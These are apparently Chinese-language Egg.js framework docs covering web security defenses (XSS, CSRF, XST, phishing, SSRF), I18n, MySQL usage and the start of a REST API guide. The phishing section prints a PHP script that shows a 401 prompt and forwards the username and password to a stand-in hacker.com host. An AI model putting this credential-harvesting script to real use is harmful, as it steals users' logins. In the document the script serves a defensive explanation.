helper.sjs() 用于在 JavaScript（包括 onload 等 event）中输出变量，会对变量中字符进行 JavaScript ENCODE， 将所有非白名单字符转义为 \x 形式，防止 XSS 攻击，也确保在 js 中输出的正确性。使用实例：

const foo = '"hello"';

// 未使用 sjs
console.log(`var foo = "${foo}";`);
// => var foo = ""hello"";

// 使用 sjs
console.log(`var foo = "${this.helper.sjs(foo)}";`);
// => var foo = "\\x22hello\\x22";
还有一种情况，有时候我们需要在 JavaScript 中输出 json ，若未做转义，易被利用为 XSS 漏洞。框架提供了 helper.sjson() 宏做 json encode，会遍历 json 中的 key ，将 value 的值中，所有非白名单字符转义为 \x 形式，防止 XSS 攻击。同时保持 json 结构不变。 若存在模板中输出一个 JSON 字符串给 JavaScript 使用的场景，请使用 helper.sjson(变量名) 进行转义。

处理过程较复杂，性能损耗较大，请仅在必要时使用。

实例:

<script>
  window.locals = {{ helper.sjson(locals) }};
</script>
 Stored XSS
基于存储的 XSS 攻击，是通过提交带有恶意脚本的内容存储在服务器上，当其他人看到这些内容时发起 Web 攻击。一般提交的内容都是通过一些富文本编辑器编辑的，很容易插入危险代码。

 防范方式
框架提供了 helper.shtml() 方法对字符串进行 XSS 过滤。

注意，将富文本（包含 HTML 代码的文本）当成变量直接在模版里面输出时，需要用到 shtml 来处理。 使用 shtml 可以输出 HTML 的 tag，同时执行 XSS 的过滤动作，过滤掉非法的脚本。

由于是一个非常复杂的安全处理过程，对服务器处理性能一定影响，如果不是输出 HTML，请勿使用。

简单示例：

// js
const value = `<a href="http://www.domain.com">google</a><script>evilcode…</script>`;

// 模板
<html>
<body>
  {{ helper.shtml(value) }}
</body>
</html>
// => <a href="http://www.domain.com">google</a>&lt;script&gt;evilcode…&lt;/script&gt;
shtml 在 xss 模块基础上增加了针对域名的过滤。

默认规则
自定义过滤项： http://jsxss.com/zh/options.html
例如只支持 a 标签，且除了 title 其他属性都过滤掉： whiteList: {a: ['title']}

options:

config.helper.shtml.domainWhiteList: [] 可拓展 href 和 src 中允许的域名白名单。
注意，shtml 使用了严格的白名单机制，除了过滤掉 XSS 风险的字符串外， 在默认规则外的 tag 和 attr 都会被过滤掉。

例如 HTML 标签就不在白名单中，

const html = '<html></html>';

// html
{{ helper.shtml(html) }}

// 输出空
常见的 data-xx 属性由于不在白名单中，所以都会被过滤。

所以，一定要注意 shtml 的适用场景，一般是针对来自用户的富文本输入，切忌滥用，功能既受到限制，又会影响服务端性能。 此类场景一般是论坛、评论系统等，即便是论坛等如果不支持 HTML 内容输入，也不要使用此 Helper，直接使用 escape 即可。

 JSONP XSS
JSONP 的 callback 参数非常危险，他有两种风险可能导致 XSS

1、callback 参数意外截断js代码，特殊字符单引号双引号，换行符均存在风险。

2、callback 参数恶意添加标签（如 <script> ），造成 XSS 漏洞。

参考 JSONP 安全攻防

框架内部使用 jsonp-body 来对 JSONP 请求进行安全防范。

防御内容：

callback 函数名词最长 50 个字符限制
callback 函数名只允许 [, ], a-zA-Z0123456789_, $, .，防止一般的 XSS，utf-7 XSS等攻击。
可定义配置：

callback 默认 _callback，可以重命名。
limit - 函数名 length 限制，默认 50。
 其他 XSS 的防范方式
浏览器自身具有一定针对各种攻击的防范能力，他们一般是通过开启 Web 安全头生效的。框架内置了一些常见的 Web 安全头的支持。

 CSP
W3C 的 Content Security Policy，简称 CSP，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。

框架内支持 CSP 的配置，不过是默认关闭的，开启后可以有效的防止 XSS 攻击的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 CSP 是什么。

 X-Download-Options:noopen
默认开启，禁用 IE 下下载框Open按钮，防止 IE 下下载文件默认被打开 XSS。

 X-Content-Type-Options:nosniff
禁用 IE8 自动嗅探 mime 功能例如 text/plain 却当成 text/html 渲染，特别当本站点 serve 的内容未必可信的时候。

 X-XSS-Protection
IE 提供的一些 XSS 检测与防范，默认开启

close 默认值false，即设置为 1; mode=block
 安全威胁 CSRF 的防范
CSRF（Cross-site request forgery跨站请求伪造，也被称为 One Click Attack 或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。 CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。

 防范方式
通常来说，对于 CSRF 攻击有一些通用的防范方案，简单的介绍几种常用的防范方案：

Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。
Double Cookie Defense：将 token 设置在 Cookie 中，在提交 post 请求的时候提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。
Custom Header：信任带有特定的 header（例如 X-Requested-With: XMLHttpRequest）的请求。这个方案可以被绕过，所以 rails 和 django 等框架都放弃了该防范方式。
框架结合了上述几种防范方式，提供了一个可配置的 CSRF 防范策略。

 使用方式
 同步表单的 CSRF 校验
在同步渲染页面时，在表单请求中增加一个 name 为 _csrf 的 url query，值为 ctx.csrf，这样用户在提交这个表单的时候会将 CSRF token 提交上来：

<form method="POST" action="/upload?_csrf={{ ctx.csrf | safe }}" enctype="multipart/form-data">
  title: <input name="title" />
  file: <input name="file" type="file" />
  <button type="submit">upload</button>
</form>
传递 CSRF token 的字段可以在配置中改变：

// config/config.default.js
module.exports = {
  security: {
    csrf: {
      queryName: '_csrf', // 通过 query 传递 CSRF token 的默认字段为 _csrf
      bodyName: '_csrf', // 通过 body 传递 CSRF token 的默认字段为 _csrf
    },
  },
};
为了防范 BREACH 攻击，通过同步方式渲染到页面上的 CSRF token 在每次请求时都会变化，egg-view-nunjucks 等 View 插件会自动对 Form 进行注入，对应用开发者无感知。

 AJAX 请求
在 CSRF 默认配置下，token 会被设置在 Cookie 中，在 AJAX 请求的时候，可以从 Cookie 中取到 token，放置到 query、body 或者 header 中发送给服务端。

In jQuery:

var csrftoken = Cookies.get('csrfToken');

function csrfSafeMethod(method) {
  // these HTTP methods do not require CSRF protection
  return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
}
$.ajaxSetup({
  beforeSend: function(xhr, settings) {
    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
      xhr.setRequestHeader('x-csrf-token', csrftoken);
    }
  },
});
通过 header 传递 CSRF token 的字段也可以在配置中改变：

// config/config.default.js
module.exports = {
  security: {
    csrf: {
      headerName: 'x-csrf-token', // 通过 header 传递 CSRF token 的默认字段为 x-csrf-token
    },
  },
};
 Session vs Cookie 存储
默认配置下，框架会将 CSRF token 存在 Cookie 中，以方便 AJAX 请求获取到。但是所有的子域名都可以设置 Cookie，因此当我们的应用处于无法保证所有的子域名都受控的情况下，存放在 Cookie 中可能有被 CSRF 攻击的风险。框架提供了一个配置项，可以将 token 存放到 Session 中。

// config/config.default.js
module.exports = {
  security: {
    csrf: {
      useSession: true, // 默认为 false，当设置为 true 时，将会把 csrf token 保存到 Session 中
      cookieName: 'csrfToken', // Cookie 中的字段名，默认为 csrfToken
      sessionName: 'csrfToken', // Session 中的字段名，默认为 csrfToken
    },
  },
};
 忽略 JSON 请求(已废弃)
注意：该选项已废弃，攻击者可以通过 flash + 307 来攻破，请不要在生产环境打开改选项！

在 SOP 的安全策略保护下，基本上所有的现代浏览器都不允许跨域发起 content-type 为 JSON 的请求，因此我们可以直接放过类型的 JSON 格式的请求。

// config/config.default.js
module.exports = {
  security: {
    csrf: {
      ignoreJSON: true, // 默认为 false，当设置为 true 时，将会放过所有 content-type 为 `application/json` 的请求
    },
  },
};
 刷新 CSRF token
当 CSRF token 存储在 Cookie 中时，一旦在同一个浏览器上发生用户切换，新登陆的用户将会依旧使用旧的 token（之前用户使用的），这会带来一定的安全风险，因此在每次用户登陆的时候都必须刷新 CSRF token。

// login controller
exports.login = function* (ctx) {
  const { username, password } = ctx.request.body;
  const user = yield ctx.service.user.find({ username, password });
  if (!user) ctx.throw(403);
  ctx.session = { user };

  // 调用 rotateCsrfSecret 刷新用户的 CSRF token
  ctx.rotateCsrfSecret();

  ctx.body = { success: true };
}
 安全威胁 XST 的防范
XST 的全称是 Cross-Site Tracing，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 Cookie。

下面我们基于 Koa 来实现一个简单的支持 TRACE 方法的服务器：

var koa = require('koa');
var app = koa();

app.use(function* (next) {
  this.cookies.set('a', 1, { httpOnly: true });
  if (this.method === 'TRACE') {
    var body = '';
    for (header in this.headers) {
      body += header + ': ' + this.headers[header] + '\r\n';
    }
    this.body = body;
  }
  yield* next;
});

app.listen(7001);
启动服务后，先发个 GET 请求 curl -i http://127.0.0.1:7001，得到如下响应：

HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 2
Date: Thu, 06 Nov 2014 05:04:42 GMT
Connection: keep-alive

OK
服务器设置了一个 httpOnly 的 Cookie 为 1，在浏览器环境中，是无法通过脚本获取它的。

接着我们发 TRACE 请求到服务器curl -X TRACE -b a=1 -i http://127.0.0.1:7001，并带上 Cookie，得到如下响应：

HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 73
Date: Thu, 06 Nov 2014 05:07:47 GMT
Connection: keep-alive

user-agent: curl/7.37.1
host: 127.0.0.1:7001
accept: */*  //*/
cookie: a=1
在响应体里可以看到完整的头信息，这样我们就绕过了 httpOnly 的限制，拿到了cookie=1，造成了很大的风险。

 拓展阅读
"http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html"

"http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/"

 防范方式
框架已经禁止了 trace，track，options 三种危险类型请求。

 安全威胁 钓鱼攻击 的防范
钓鱼有多种方式，这里介绍 url 钓鱼、图片钓鱼和 iframe 钓鱼。

 url 钓鱼
服务端未对传入的跳转 url 变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。 由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易； 也可能引发的 XSS 漏洞（主要是跳转常常使用 302 跳转，即设置 HTTP 响应头，Locatioin: url，如果 url 包含了 CRLF，则可能隔断了 HTTP 响应头，使得后面部分落到了 HTTP body，从而导致 XSS 漏洞）。

 防范方式
若跳转的 url 事先是可以确定的，包括 url 和参数的值，则可以在后台先配置好，url 参数只需传对应 url 的索引即可，通过索引找到对应具体 url 再进行跳转；
若跳转的 url 事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名；
若 1 和 2 都不满足，url 事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url 进行按规则校验：判断 url 是否在应用授权的白名单内。
框架提供了安全跳转的方法，可以通过配置白名单避免这种风险。

ctx.redirect(url) 如果不在配置的白名单内，则禁止。
ctx.unsafeRedirect(url) 一般不建议使用，明确了解可能带来的风险后使用。
安全方案覆盖了默认的ctx.redirect方法，所有的跳转均会经过安全域名的判断。

用户如果使用ctx.redirect方法，需要在应用的配置文件中做如下配置：

// config/config.default.js
exports.security = {
  domainWhiteList:['.domain.com'],  // 安全白名单，以 . 开头
};
若用户没有配置 domainWhiteList 或者 domainWhiteList数组内为空，则默认会对所有跳转请求放行，即等同于ctx.unsafeRedirect(url)

 图片钓鱼
如果可以允许用户向网页里插入未经验证的外链图片，这有可能出现钓鱼风险。

比如常见的 401钓鱼, 攻击者在访问页面时，页面弹出验证页面让用户输入帐号及密码，当用户输入之后，帐号及密码就存储到了黑客的服务器中。 通常这种情况会出现在<img src=$url />中，系统不对$url是否在域名白名单内进行校验。

攻击者可以在自己的服务器中构造以下代码：

401.php：作用为弹出 401 窗口，并且记录用户信息。

<?php
  header('WWW-Authenticate: Basic realm="No authorization"');
  header('HTTP/1.1 401 Unauthorized');
  $domain = "http://hacker.com/fishing/";
  if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
    header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
  }
?>
之后攻击者生成一个图片链接<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" />。

当用户访问时，会弹出信息让用户点击，用户输入的用户名及密码会被黑客的服务器偷偷记录。

 防范方式
框架提供了 .surl() 宏做 url 过滤。

用于在 html 标签中中要解析 url 的地方（比如 <a href=""/><img src=""/>），其他地方不允许使用。

对模板中要输出的变量，加 helper.surl($value)。

注意：在需要解析 url 的地方，surl 外面一定要加上双引号，否则就会导致XSS漏洞。

不使用 surl

<a href="$value" />
output:

<a href="http://ww.safe.com<script>" />
使用 surl

<a href="helper.surl($value)" />
output:

<a href="http://ww.safe.com&lt;script&gt;" />
 iframe 钓鱼
iframe 钓鱼，通过内嵌 iframe 到被攻击的网页中，攻击者可以引导用户去点击 iframe 指向的危险网站，甚至遮盖，影响网站的正常功能，劫持用户的点击操作。

框架提供了 X-Frame-Options 这个安全头来防止 iframe 钓鱼。默认值为 SAMEORIGIN，只允许同域把本页面当作 iframe 嵌入。

当需要嵌入一些可信的第三方网页时，可以关闭这个配置。

 安全威胁 HPP 的防范
Http Parameter Pollution（HPP)，即 HTTP 参数污染攻击。在HTTP协议中是允许同样名称的参数出现多次，而由于应用的实现不规范，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护的后果。

HPP 可能导致的安全威胁有：

绕过防护和参数校验。
产生逻辑漏洞和报错，影响应用代码执行。
 拓展阅读
https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
http://blog.csdn.net/eatmilkboy/article/details/6761407
https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf
ebay 因参数污染存在 RCE（远程命令执行）漏洞：http://secalert.net/2013/12/13/ebay-remote-code-execution/
 如何防范
框架本身会在客户端传输 key 相同而 value 不同的参数时，强制使用第一个参数，因此不会导致 hpp 攻击。

 中间人攻击与 HTTP / HTTPS
HTTP 是网络应用广泛使用的协议，负责 Web 内容的请求和获取。然而，内容请求和获取时会经过许多中间人，主要是网络环节，充当内容入口的浏览器、路由器厂商、WIFI提供商、通信运营商，如果使用了代理、翻墙软件则会引入更多中间人。由于 HTTP 请求的路径、参数默认情况下均是明文的，因此这些中间人可以对 HTTP 请求进行监控、劫持、阻挡。

在没有 HTTPS 时，运营商可在用户发起请求时直接跳转到某个广告，或者直接改变搜索结果插入自家的广告。如果劫持代码出现了 BUG ，则直接让用户无法使用，出现白屏。

数据泄露、请求劫持、内容篡改等等问题，核心原因就在于 HTTP 是全裸式的明文请求，域名、路径和参数都被中间人们看得一清二楚。HTTPS 做的就是给请求加密，让其对用户更加安全。对于自身而言除了保障用户利益外，还可避免本属于自己的流量被挟持，以保护自身利益。

尽管 HTTPS 并非绝对安全，掌握根证书的机构、掌握加密算法的组织同样可以进行中间人形式的攻击。不过HTTPS是现行架构下最安全的解决方案，并且它大幅增加了中间人攻击的成本。

因此，请各位使用 Egg 框架开发网站的开发者，务必推动自己的网站升级到 HTTPS。

对于 HTTPS 来讲，还有一点要注意的是 HTTP 严格传输安全（HSTS），如果不使用 HSTS，当用户在浏览器中输入网址时没有加 HTTPS，浏览器会默认使用 HTTP 访问

框架提供了 hsts Strict-Transport-Security 这个头的默认开启。让 HTTPS 站点不跳转到 HTTP，如果站点支持 HTTPS，请一定要开启。

如果我们的Web 站点是 http 站点，需要关闭这个头。配置如下：

maxAge 默认一年 365 * 24 * 3600。
includeSubdomains 默认 false, 可以添加子域名，保证所有子域名都使用 HTTPS 访问。
 安全威胁 SSRF 的防范
通过 Server-Side Request Forgery(SSRF) 攻击，攻击者可以发起网络请求访问或者操作内部网络的资源。

一般来说，SSRF 安全漏洞常见于开发者在服务端直接请求客户端传递进来的 URL 资源，一旦攻击者传入一些内部的 URL 即可发起 SSRF 攻击。

 如何防范
通常我们会基于内网 IP 黑名单的形式来防范 SSRF 攻击，通过对解析域名后得到的 IP 做过滤，禁止访问内部 IP 地址来达到防范 SSRF 攻击的目的。

框架在 ctx, app 和 agent 上都提供了 safeCurl 方法，在发起网络请求的同时会对指定的内网 IP 地址过滤，除此之外，该方法和框架提供的 curl 方法一致。

ctx.safeCurl(url, options)
app.safeCurl(url, options)
agent.safeCurl(url, options)
 配置
直接调用 safeCurl 方法其实并没有任何作用，还需要配合安全配置项。

ipBlackList(Array) - 配置内网 IP 名单，在这些网段内的 IP 地址无法被访问。
checkAddress(Function) - 直接配置一个检查 IP 地址的函数，根据函数的返回值来判断是否允许在 safeCurl 中被访问，当返回非 true 时，该 IP 无法被访问。checkAddress 优先级高于 ipBlackList。
// config/config.default.js
exports.security = {
  ssrf: {
    ipBlackList: [
      '10.0.0.0/8', // 支持 IP 网段
      '0.0.0.0/32',
      '127.0.0.1',  // 支持指定 IP 地址
    ],
    // 配置了 checkAddress 时，ipBlackList 不会生效
    checkAddress(ip) {
      return ip !== '127.0.0.1';
    },
  },
};
 其他安全工具
 ctx.isSafeDomain(domain)
是否为安全域名。安全域名在配置中配置，见 ctx.redirect 部分。

 app.injectCsrf(str)
这个函数提供了模板预处理－自动插入 CSRF key 的能力，可以自动在所有的 form 标签中插入 CSRF 隐藏域，用户就不需要手动写了。

 app.injectNonce(str)
这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 CSP 2.0 nonce 特性，可以使用这个函数。参考 CSP 是什么。

这个函数会扫描模板中的 script 标签，并自动加上 nonce 头。

 app.injectHijackingDefense(str)
对于没有开启 HTTPS 的网站，这个函数可以有限的防止运营商劫持。

--------------------------------------------------

I18n 国际化
为了方便开发多语言应用，框架内置了国际化（I18n）支持，由 egg-i18n 插件提供。

 默认语言
默认语言是 en-US。假设我们想修改默认语言为简体中文：

// config/config.default.js
exports.i18n = {
  defaultLocale: 'zh-CN',
};
 切换语言
我们可以通过下面几种方式修改应用的当前语言（修改后会记录到 locale 这个 Cookie），下次请求直接用设定好的语言。

优先级从高到低：

query: /?locale=en-US
cookie: locale=zh-TW
header: Accept-Language: zh-CN,zh;q=0.5
如果想修改 query 或者 Cookie 参数名称：

// config/config.default.js
exports.i18n = {
  queryField: 'locale',
  cookieField: 'locale',
  // Cookie 默认一年后过期， 如果设置为 Number，则单位为 ms
  cookieMaxAge: '1y',
};
 编写 I18n 多语言文件
多种语言的配置是独立的，统一存放在 config/locale/*.js 下。 //*/

- config/locale/
  - en-US.js
  - zh-CN.js
  - zh-TW.js
不仅对于应用目录生效，在框架，插件的 config/locale 目录下同样生效。

注意单词拼写，是 locale 不是 locals。

例如：

// config/locale/zh-CN.js
module.exports = {
  Email: '邮箱',
};
或者也可以用 JSON 格式的文件：

// config/locale/zh-CN.json
{
  "Email": "邮箱"
}
 获取多语言文本
我们可以使用 __ (Alias: gettext) 函数获取 locale 文件夹下面的多语言文本。

注意: __ 是两个下划线

以上面配置过的多语言为例：

ctx.__('Email')
// zh-CN => 邮箱
// en-US => Email
如果文本中含有 %s，%j 等 format 函数，可以按照 util.format() 类似的方式调用：

// config/locale/zh-CN.js
module.exports = {
  'Welcome back, %s!': '欢迎回来，%s!',
};

ctx.__('Welcome back, %s!', 'Shawn');
// zh-CN => 欢迎回来，Shawn!
// en-US => Welcome back, Shawn!
同时支持数组下标占位符方式，例如：

// config/locale/zh-CN.js
module.exports = {
  'Hello {0}! My name is {1}.': '你好 {0}! 我的名字叫 {1}。',
};

ctx.__('Hello {0}! My name is {1}.', ['foo', 'bar'])
// zh-CN => 你好 foo！我的名字叫 bar。
// en-US => Hello foo! My name is bar.
 Controller 中使用
class HomeController extends Controller {
  async index() {
    const ctx = this.ctx;
    ctx.body = {
      message: ctx.__('Welcome back, %s!', ctx.user.name)
      // 或者使用 gettext，gettext 是 __ 函数的 alias
      // message: ctx.gettext('Welcome back', ctx.user.name)
      user: ctx.user,
    };
  }
}
 View 中使用
假设我们使用的模板引擎是 Nunjucks

<li>{{ __('Email') }}: {{ user.email }}</li>
<li>
  {{ __('Welcome back, %s!', user.name) }}
</li>
<li>
  {{ __('Hello {0}! My name is {1}.', ['foo', 'bar']) }}
</li>

--------------------------------------------------
MySQL
在 Web 应用方面 MySQL 是最常见，最好的关系型数据库之一。非常多网站都选择 MySQL 作为网站数据库。

 egg-mysql
框架提供了 egg-mysql 插件来访问 MySQL 数据库。这个插件既可以访问普通的 MySQL 数据库，也可以访问基于 MySQL 协议的在线数据库服务。

 安装与配置
安装对应的插件 egg-mysql ：

$ npm i --save egg-mysql
开启插件：

// config/plugin.js
exports.mysql = {
  enable: true,
  package: 'egg-mysql',
};
在 config/config.${env}.js 配置各个环境的数据库连接信息。

 单数据源
如果我们的应用只需要访问一个 MySQL 数据库实例，可以如下配置：

// config/config.${env}.js
exports.mysql = {
  // 单数据库信息配置
  client: {
    // host
    host: 'mysql.com',
    // 端口号
    port: '3306',
    // 用户名
    user: 'test_user',
    // 密码
    password: 'test_password',
    // 数据库名
    database: 'test',
  },
  // 是否加载到 app 上，默认开启
  app: true,
  // 是否加载到 agent 上，默认关闭
  agent: false,
};
使用方式：

await app.mysql.query(sql, values); // 单实例可以直接通过 app.mysql 访问
 多数据源
如果我们的应用需要访问多个 MySQL 数据源，可以按照如下配置：

exports.mysql = {
  clients: {
    // clientId, 获取client实例，需要通过 app.mysql.get('clientId') 获取
    db1: {
      // host
      host: 'mysql.com',
      // 端口号
      port: '3306',
      // 用户名
      user: 'test_user',
      // 密码
      password: 'test_password',
      // 数据库名
      database: 'test',
    },
    db2: {
      // host
      host: 'mysql2.com',
      // 端口号
      port: '3307',
      // 用户名
      user: 'test_user',
      // 密码
      password: 'test_password',
      // 数据库名
      database: 'test',
    },
    // ...
  },
  // 所有数据库配置的默认值
  default: {

  },

  // 是否加载到 app 上，默认开启
  app: true,
  // 是否加载到 agent 上，默认关闭
  agent: false,
};
使用方式：

const client1 = app.mysql.get('db1');
await client1.query(sql, values);

const client2 = app.mysql.get('db2');
await client2.query(sql, values);
 动态创建
我们可以不需要将配置提前申明在配置文件中，而是在应用运行时动态的从配置中心获取实际的参数，再来初始化一个实例。

// {app_root}/app.js
module.exports = app => {
  app.beforeStart(async () => {
    // 从配置中心获取 MySQL 的配置
    // { host: 'mysql.com', port: '3306', user: 'test_user', password: 'test_password', database: 'test' }
    const mysqlConfig = await app.configCenter.fetch('mysql');
    app.database = app.mysql.createInstance(mysqlConfig);
  });
};
 Service 层
由于对 MySQL 数据库的访问操作属于 Web 层中的数据处理层，因此我们强烈建议将这部分代码放在 Service 层中维护。

下面是一个 Service 中访问 MySQL 数据库的例子。

更多 Service 层的介绍，可以参考 Service

// app/service/user.js
class UserService extends Service {
  async find(uid) {
    // 假如 我们拿到用户 id 从数据库获取用户详细信息
    const user = await this.app.mysql.get('users', { id: 11 });
    return { user };
  }
}
之后可以通过 Controller 获取 Service 层拿到的数据。

// app/controller/user.js
class UserController extends Controller {
  async info() {
    const ctx = this.ctx;
    const userId = ctx.params.id;
    const user = await ctx.service.user.find(userId);
    ctx.body = user;
  }
}
 如何编写 CRUD 语句
下面的语句若没有特殊注明，默认都书写在 app/service 下。

 Create
可以直接使用 insert 方法插入一条记录。

// 插入
const result = await this.app.mysql.insert('posts', { title: 'Hello World' }); // 在 post 表中，插入 title 为 Hello World 的记录

=> INSERT INTO `posts`(`title`) VALUES('Hello World');

console.log(result);
=>
{
  fieldCount: 0,
  affectedRows: 1,
  insertId: 3710,
  serverStatus: 2,
  warningCount: 2,
  message: '',
  protocol41: true,
  changedRows: 0
}

// 判断插入成功
const insertSuccess = result.affectedRows === 1;
 Read
可以直接使用 get 方法或 select 方法获取一条或多条记录。select 方法支持条件查询与结果的定制。

查询一条记录
const post = await this.app.mysql.get('posts', { id: 12 });

=> SELECT * FROM `posts` WHERE `id` = 12 LIMIT 0, 1;
查询全表
const results = await this.app.mysql.select('posts');

=> SELECT * FROM `posts`;
条件查询和结果定制
const results = await this.app.mysql.select('posts', { // 搜索 post 表
  where: { status: 'draft', author: ['author1', 'author2'] }, // WHERE 条件
  columns: ['author', 'title'], // 要查询的表字段
  orders: [['created_at','desc'], ['id','desc']], // 排序方式
  limit: 10, // 返回数据量
  offset: 0, // 数据偏移量
});

=> SELECT `author`, `title` FROM `posts`
  WHERE `status` = 'draft' AND `author` IN('author1','author2')
  ORDER BY `created_at` DESC, `id` DESC LIMIT 0, 10;
 Update
可以直接使用 update 方法更新数据库记录。

// 修改数据，将会根据主键 ID 查找，并更新
const row = {
  id: 123,
  name: 'fengmk2',
  otherField: 'other field value',    // any other fields u want to update
  modifiedAt: this.app.mysql.literals.now, // `now()` on db server
};
const result = await this.app.mysql.update('posts', row); // 更新 posts 表中的记录

=> UPDATE `posts` SET `name` = 'fengmk2', `modifiedAt` = NOW() WHERE id = 123 ;

// 判断更新成功
const updateSuccess = result.affectedRows === 1;

// 如果主键是自定义的 ID 名称，如 custom_id，则需要在 `where` 里面配置
const row = {
  name: 'fengmk2',
  otherField: 'other field value',    // any other fields u want to update
  modifiedAt: this.app.mysql.literals.now, // `now()` on db server
};

const options = {
  where: {
    custom_id: 456
  }
};
const result = await this.app.mysql.update('posts', row, options); // 更新 posts 表中的记录

=> UPDATE `posts` SET `name` = 'fengmk2', `modifiedAt` = NOW() WHERE custom_id = 456 ;

// 判断更新成功
const updateSuccess = result.affectedRows === 1;
 Delete
可以直接使用 delete 方法删除数据库记录。

const result = await this.app.mysql.delete('posts', {
  author: 'fengmk2',
});

=> DELETE FROM `posts` WHERE `author` = 'fengmk2';
 直接执行 sql 语句
插件本身也支持拼接与直接执行 sql 语句。使用 query 可以执行合法的 sql 语句。

注意！！我们极其不建议开发者拼接 sql 语句，这样很容易引起 sql 注入！！

如果必须要自己拼接 sql 语句，请使用 mysql.escape 方法。

参考 preventing-sql-injection-in-node-js

const postId = 1;
const results = await this.app.mysql.query('update posts set hits = (hits + ?) where id = ?', [1, postId]);

=> update posts set hits = (hits + 1) where id = 1;
 使用事务
MySQL 事务主要用于处理操作量大，复杂度高的数据。比如说，在人员管理系统中，你删除一个人员，你既需要删除人员的基本资料，也要删除和该人员相关的信息，如信箱，文章等等。这时候使用事务处理可以方便管理这一组操作。 一个事务将一组连续的数据库操作，放在一个单一的工作单元来执行。该组内的每个单独的操作是成功，事务才能成功。如果事务中的任何操作失败，则整个事务将失败。

一般来说，事务是必须满足4个条件（ACID）： Atomicity（原子性）、Consistency（一致性）、Isolation（隔离性）、Durability（可靠性）

原子性：确保事务内的所有操作都成功完成，否则事务将被中止在故障点，以前的操作将回滚到以前的状态。
一致性：对于数据库的修改是一致的。
隔离性：事务是彼此独立的，不互相影响
持久性：确保提交事务后，事务产生的结果可以永久存在。
因此，对于一个事务来讲，一定伴随着 beginTransaction、commit 或 rollback，分别代表事务的开始，成功和失败回滚。

egg-mysql 提供了两种类型的事务。

 手动控制
优点：beginTransaction, commit 或 rollback 都由开发者来完全控制，可以做到非常细粒度的控制。
缺点：手写代码比较多，不是每个人都能写好。忘记了捕获异常和 cleanup 都会导致严重 bug。
const conn = await app.mysql.beginTransaction(); // 初始化事务

try {
  await conn.insert(table, row1);  // 第一步操作
  await conn.update(table, row2);  // 第二步操作
  await conn.commit(); // 提交事务
} catch (err) {
  // error, rollback
  await conn.rollback(); // 一定记得捕获异常后回滚事务！！
  throw err;
}
 自动控制：Transaction with scope
API：beginTransactionScope(scope, ctx)
scope: 一个 generatorFunction，在这个函数里面执行这次事务的所有 sql 语句。
ctx: 当前请求的上下文对象，传入 ctx 可以保证即便在出现事务嵌套的情况下，一次请求中同时只有一个激活状态的事务。
优点：使用简单，不容易犯错，就感觉事务不存在的样子。
缺点：整个事务要么成功，要么失败，无法做细粒度控制。
const result = await app.mysql.beginTransactionScope(async conn => {
  // don't commit or rollback by yourself
  await conn.insert(table, row1);
  await conn.update(table, row2);
  return { success: true };
}, ctx); // ctx 是当前请求的上下文，如果是在 service 文件中，可以从 `this.ctx` 获取到
// if error throw on scope, will auto rollback
 表达式(Literal)
如果需要调用 MySQL 内置的函数（或表达式），可以使用 Literal。

 内置表达式
NOW()：数据库当前系统时间，通过 app.mysql.literals.now 获取。
await this.app.mysql.insert(table, {
  create_time: this.app.mysql.literals.now,
});

=> INSERT INTO `$table`(`create_time`) VALUES(NOW())
 自定义表达式
下例展示了如何调用 MySQL 内置的 CONCAT(s1, ...sn) 函数，做字符串拼接。

const Literal = this.app.mysql.literals.Literal;
const first = 'James';
const last = 'Bond';
await this.app.mysql.insert(table, {
  id: 123,
  fullname: new Literal(`CONCAT("${first}", "${last}"`),
});

=> INSERT INTO `$table`(`id`, `fullname`) VALUES(123, CONCAT("James", "Bond")):

--------------------------------------------------
实现 RESTful API
通过 Web 技术开发服务给客户端提供接口，可能是各个 Web 框架最广泛的应用之一。这篇文章我们拿 CNode 社区 的接口来看一看通过 Egg 如何实现 RESTful API 给客户端调用。

CNode 社区现在 v1 版本的接口不是完全符合 RESTful 语义，在这篇文章中，我们将基于 CNode V1 的接口，封装一个更符合 RESTful 语义的 V2 版本 API。

 设计响应格式
在 RESTful 风格的设计中，我们会通过响应状态码来标识响应的状态，保持响应的 body 简洁，只返回接口数据。以 topics 资源为例：

 获取主题列表
GET /api/v2/topics
响应状态码：200
响应体：
[
  {
    "id": "57ea257b3670ca3f44c5beb6",
    "author_id": "541bf9b9ad60405c1f151a03",
    "tab": "share",
    "content": "content",
    "last_reply_at": "2017-01-11T13:32:25.089Z",
    "good": false,
    "top": true,
    "reply_count": 155,
